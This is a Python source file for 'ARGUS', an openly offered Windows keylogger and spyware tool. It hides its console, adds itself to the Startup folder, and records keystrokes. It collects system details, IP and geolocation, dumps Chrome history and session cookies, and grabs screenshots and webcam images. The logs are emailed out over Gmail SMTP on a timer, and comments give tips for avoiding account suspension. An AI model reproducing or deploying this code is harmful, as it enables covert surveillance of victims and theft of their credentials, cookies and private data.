
                                        # You Get The Idea (:

import time
import os
import threading 
import smtplib
import sys
import platform
import sqlite3
import psutil
import mimetypes
import socket
import requests
import urllib.request
import json
from pynput.keyboard import Listener
import pyscreenshot
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from ecapture import ecapture as ec
import win32console
import wmi
from win32 import win32gui
import win32ui, win32con, win32api
import getpass

USER_NAME = getpass.getuser()

def hide():
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)





BLUE, RED, WHITE, YELLOW, GREEN, CYAN, MAGENTA, =('\033[1;34;40m', '\033[1;31;40m', '\033[1;37;40m', '\033[1;33;40m', '\033[1;32;40m', '\033[1;36;40m', '\033[1;35;40m')



sys.stdout.write(BLUE + '''





                                                       
                                                       

                                                                                                                  
                                                                                                                  
               AAA               RRRRRRRRRRRRRRRRR           GGGGGGGGGGGGGUUUUUUUU     UUUUUUUU   SSSSSSSSSSSSSSS 
              A:::A              R::::::::::::::::R       GGG::::::::::::GU::::::U     U::::::U SS:::::::::::::::S
             A:::::A             R::::::RRRRRR:::::R    GG:::::::::::::::GU::::::U     U::::::US:::::SSSSSS::::::S
            A:::::::A            RR:::::R     R:::::R  G:::::GGGGGGGG::::GUU:::::U     U:::::UUS:::::S     SSSSSSS
           A:::::::::A             R::::R     R:::::R G:::::G       GGGGGG U:::::U     U:::::U S:::::S            
          A:::::A:::::A            R::::R     R:::::RG:::::G               U:::::D     D:::::U S:::::S            
         A:::::A A:::::A           R::::RRRRRR:::::R G:::::G               U:::::D     D:::::U  S::::SSSS         
        A:::::A   A:::::A          R:::::::::::::RR  G:::::G    GGGGGGGGGG U:::::D     D:::::U   SS::::::SSSSS    
       A:::::A     A:::::A         R::::RRRRRR:::::R G:::::G    G::::::::G U:::::D     D:::::U     SSS::::::::SS  
      A:::::AAAAAAAAA:::::A        R::::R     R:::::RG:::::G    GGGGG::::G U:::::D     D:::::U        SSSSSS::::S 
     A:::::::::::::::::::::A       R::::R     R:::::RG:::::G        G::::G U:::::D     D:::::U             S:::::S 'WINDOWS'
    A:::::AAAAAAAAAAAAA:::::A      R::::R     R:::::R G:::::G       G::::G U::::::U   U::::::U             S:::::S
   A:::::A             A:::::A   RR:::::R     R:::::R  G:::::GGGGGGGG::::G U:::::::UUU:::::::U SSSSSSS     S:::::S
  A:::::A               A:::::A  R::::::R     R:::::R   GG:::::::::::::::G  UU:::::::::::::UU  S::::::SSSSSS:::::S
 A:::::A                 A:::::A R::::::R     R:::::R     GGG::::::GGG:::G    UU:::::::::UU    S:::::::::::::::SS 
AAAAAAA                   AAAAAAARRRRRRRR     RRRRRRR        GGGGGG   GGGG      UUUUUUUUU       SSSSSSSSSSSSSSS '''+ GREEN + '  BY ALDON\n\n\n\n' )
print(WHITE + '                               ')



#get system info



getsysinfo = {'getinfo':platform.uname(), 'getarch':platform.architecture() ,'getversion':sys.version ,'getlogin':os.getlogin(),'getpid':os.getpid(),'getenv':os.getenv('APPDATA'), 'getpid':os.getpid() ,'datetime':time.ctime(time.time())}

private_ip = socket.gethostbyname(socket.gethostname())

public_ip = requests.get('http://ip.42.pl/raw').text


#getlocation

with urllib.request.urlopen("https://geolocation-db.com/json") as url:
    data = json.loads(url.read().decode())
    


combined = f"""[+++] Argus Started At {getsysinfo['datetime']} [+++]\n \n[+++] Windows Victim System info in detail : {getsysinfo['getinfo']} [+++]\n \n[+++] Python Version : {getsysinfo['getversion']}\n \n
[+++] System Architecture : {getsysinfo['getarch']} [+++]\n \n[+++] User : {getsysinfo['getlogin']} [+++]\n\n[+++] PID : {getsysinfo['getpid']} [+++]\n  \n[+++] Home Environment : {getsysinfo['getenv']} [+++]\n 
[+++] Public IP Address : {public_ip} [+++]\n \n[+++] Private IP Address : {private_ip} [+++]\n \n[+++] Location : {data} [+++] \n  """






USER_NAME = getpass.getuser()



def hide():
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

class Monitor():

    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "ARGUS"
        self.email = email
        self.password = password
        self.subject = "ARGUS Keylogger Summary"


    def appendlog(self, string):

        self.log = self.log + string







    def save_data(self, key):
        try:
            pressed = str(key.char)
        except AttributeError:
            if key == key.space:
                pressed = "SPACE"
            elif key == key.esc:
                pressed = "ESC"
            else:
                pressed = " " + str(key) + " "


        self.appendlog(pressed)





    def send_mail(self, email, password, message, subject="ARGUS"):

        try:
        
            #send to email

            mail_content = message #Logs,Screenshots,Files ...etc

            sender_address = email  #What is Your Email  #Specify in the Bottom of the code!
            sender_pass = password  #What is Your Password #Specify in the Bottom of the code!
            receiver_address = email    #Where to send this option is  for testing purposes ... indeed if u leave this option like that you will send message to yourself!
            #Setup the MIME
            message_mail = MIMEMultipart()        
            message_mail['From'] = sender_address   #from?
            message_mail['To'] = receiver_address    #To who?
            message_mail['Subject'] = subject       #The subject line
            #The body and the attachments for the mail
            message_mail.attach(MIMEText(mail_content, 'plain'))
            #Create SMTP session for sending the mail
            session = smtplib.SMTP('smtp.gmail.com', 587)   #use gmail with port
            session.starttls()       #connect  with TLS 
            session.login(sender_address, sender_pass)  #login with mail_id and password
            text = message_mail.as_string()
            session.sendmail(sender_address, receiver_address, subject, text)
            session.quit()


        except Exception as e:
            print(e)


    def report_mail(self):

        try:

            self.send_mail(self.email, self.password, "\n\n" + self.log, self.subject)
            self.log = ""
            time_interval_ = threading.Timer(self.interval, self.report_mail)
            time_interval_.start()


        except Exception as e:
            print(e)


    
    def Sysinfo(self):
        global combined
        self.appendlog(combined)



    
    def dump_history(self):

        # dump Chrome History I suuggest Keep The try and except Block For Chrome As It Requires Killing The Process And This could be danger if you doing it for real!

        try:

            con = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History")
            cur = con.cursor()
            cur.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cur.fetchall():

                self.appendlog("Website: %s \n\t Title: %s \n\t Last Visited: %s \n\n" % (
                u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),
                u''.join(str(row[2])).encode('utf-8').strip()))


        except Exception:
            pass

    def dump_cookies(self):

        #dump Chrome Cookies I suuggest Keep The try and except Block For Chrome As It Requires Killing The Process And This could be danger if you doing it for real!
        

        try:
            con = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
            cur = con.cursor()
            cur.execute('SELECT host_key, name, value FROM Cookies')
            for row in cur.fetchall():
                self.appendlog("Hostname: %s \n\t Name: %s \n\t Value: %s \n\n" % 
                (u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),u''.join(row[2]).strip()))


        except Exception:
            pass


    def _screenshot(self):

        

        sct = pyscreenshot.grab()
        self.send_mail(email="EMAIL", password="PASSWORD", message=sct )



    def webcam(self): #Webcam Shoot
        
        try:

            capt = ec.capture(0,False,f'{time.ctime()}.jpg')
            self.appendlog(capt)
            
        except Exception:
            pass






    def run(self):

        keyboard_logger =Listener(on_press=self.save_data)
        with keyboard_logger:
            self.report_mail()
            keyboard_logger.join()





Your_Email = "example@gmail.com"
Your_Password = "Password"
                 
 

if __name__ == '__main__':


    hide()
    add_to_startup()

# INCREASE THE INTERVAL TIMER  AS MUCH AS YOU CAN OTHERWISE GOOGLE May Disable YOUR ACCOUNT
#Interval in Secounds Default is 60s ~ 1MIN

    logger = Monitor(60,Your_Email,Your_Password)
    logger.run()
    

